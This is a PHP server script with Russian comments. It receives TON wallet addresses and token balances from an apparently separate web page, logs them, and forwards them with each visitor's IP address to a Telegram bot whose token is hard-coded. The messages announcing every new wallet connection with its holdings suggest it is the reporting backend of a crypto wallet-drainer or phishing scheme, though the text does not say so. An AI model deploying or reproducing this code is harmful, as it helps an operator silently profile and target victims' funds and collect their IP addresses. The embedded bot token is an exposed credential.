<?php
// Этот файл должен быть размещен на вашем сервере для обработки данных и отправки их в Telegram

// Разрешаем CORS для запросов с вашего домена
header("Access-Control-Allow-Origin: https://heronwaterwow.github.io");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// Обработка OPTIONS запроса (preflight)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Проверяем, что запрос является POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Только POST запросы разрешены']);
    exit();
}

// Получаем данные из запроса
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// Проверяем наличие необходимых данных
if (!isset($data['address']) || !isset($data['tokens'])) {
    echo json_encode(['success' => false, 'error' => 'Отсутствуют необходимые данные']);
    exit();
}

// Логируем данные (опционально)
file_put_contents('ton_wallet_log.txt', date('Y-m-d H:i:s') . ' - ' . $input . PHP_EOL, FILE_APPEND);

// Формируем сообщение для Telegram
$message = "🔔 *Новое подключение кошелька TON*\n\n";
$message .= "📝 *Адрес кошелька:* `" . $data['address'] . "`\n\n";
$message .= "💰 *Информация о токенах:*\n";

foreach ($data['tokens'] as $token) {
    $message .= "- *" . $token['name'] . "* (" . $token['symbol'] . "): " . $token['balance'] . "\n";
}

// Добавляем информацию о времени и IP
$message .= "\n⏰ *Время подключения:* " . date('Y-m-d H:i:s');
$message .= "\n🌐 *IP адрес:* " . $_SERVER['REMOTE_ADDR'];

// Отправляем сообщение в Telegram
$telegramBotToken = '7534217100:AAGxLkFH_r8NzHSD-kXnZhs6rrSZjES9IUQ';
$chatId = '5555555555'; // Замените на ваш chat_id

$telegramApiUrl = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
$telegramData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => json_encode($telegramData)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($telegramApiUrl, false, $context);

if ($result === FALSE) {
    echo json_encode(['success' => false, 'error' => 'Ошибка при отправке сообщения в Telegram']);
    exit();
}

// Возвращаем успешный ответ
echo json_encode(['success' => true, 'message' => 'Данные успешно отправлены в Telegram']);
?>
